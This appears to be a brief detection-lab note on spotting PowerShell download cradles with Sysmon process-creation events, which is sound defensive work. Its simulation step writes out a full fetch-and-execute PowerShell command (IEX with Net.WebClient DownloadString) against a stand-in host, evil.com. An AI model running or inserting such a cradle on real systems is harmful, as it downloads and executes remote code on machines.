# 📥 PowerShell Download Cradle Execution

**Purpose:**  
Detects PowerShell commands used to download & execute payloads remotely.

**Simulation Steps:**  
- Run: `powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/mal')"`
- Look for encoded commands or suspicious URLs
- Trigger via Sysmon Event ID 1 (Process Creation)

**Screenshot:**  

